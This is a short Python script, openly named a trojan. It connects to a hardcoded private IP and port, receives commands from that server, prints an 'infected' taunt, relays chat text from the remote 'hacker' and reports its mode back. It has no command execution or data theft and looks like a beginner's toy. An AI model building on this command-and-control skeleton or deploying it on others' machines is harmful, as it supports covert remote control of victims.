import socket

def trojan():
    HOST = '192.168.43.78'  # ip
    PORT = 9090             # check if port is free
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    mode = 'default'

    def send_to_server(command, mode, message = False):
        package = f'{command}#{mode}'

        if message:
            package += f'#{message}'
        
        client.send(package.encode('utf-8'))

    while True:
        server_command = client.recv(1024).decode('utf-8')

        message = False

        if mode == 'default':
            if server_command == 'infect':
                print('\n\n\nYOU GOT INFECTED IHIHIHIH!')
            elif server_command == 'chat on':
                if mode == 'chat':
                    message = 'Chat mode is already on.'
                else:
                    mode = 'chat'
                    message = 'Chat mode on.'
        elif mode == 'chat':
            if server_command == 'chat off':
                mode = 'default'
                message = 'Chat mode off.'
            else:
                print(f'hackers says: {server_command}')

        send_to_server(server_command, mode, message)

        